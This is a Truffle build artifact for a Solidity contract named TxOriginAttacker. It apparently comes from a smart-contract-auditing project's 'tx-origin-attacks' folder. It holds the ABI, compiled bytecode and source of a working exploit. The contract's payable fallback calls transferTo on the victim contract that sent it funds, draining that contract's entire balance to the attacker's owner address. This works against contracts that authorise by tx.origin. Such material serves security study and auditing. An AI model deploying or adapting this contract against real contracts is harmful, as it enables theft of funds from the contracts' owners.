{
  "contractName": "TxOriginAttacker",
  "abi": [
    {
      "constant": false,
      "inputs": [],
      "name": "getOwner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    }
  ],
  "bytecode": "0x6060604052341561000f57600080fd5b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506101db8061005e6000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063893d20e814610131575b3373ffffffffffffffffffffffffffffffffffffffff16632ccb1b306000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16316040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b151561011b57600080fd5b6102c65a03f1151561012c57600080fd5b505050005b341561013c57600080fd5b610144610186565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050905600a165627a7a72305820d208c7146dfd84f0f3fc700effc27e0c6a2ad0f77511bc3637d30af872df55550029",
  "source": "pragma solidity ^0.4.18;\n\n// import \"./TxOriginVictim.sol\";\n\ninterface TxOriginVictim {\n    function transferTo(address to, uint amount);\n}\n\ncontract TxOriginAttacker {\n    address owner;\n\n    function TxOriginAttacker() public {\n        owner = msg.sender;\n    }\n    \n    function getOwner() public returns (address) {\n        return owner;\n    }\n\n    function() payable public {\n        TxOriginVictim(msg.sender).transferTo(owner, msg.sender.balance);\n    }\n}",
  "sourcePath": "/Users/christophercoverdale/Desktop/Projects/smart-contract-auditor/truffle/code/contracts/tx-origin-attacks/TxOriginAttacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.18+commit.9cf6e910.Emscripten.clang"
  },
  "schemaVersion": "1.0.1",
  "updatedAt": "2018-03-31T17:15:46.422Z"
}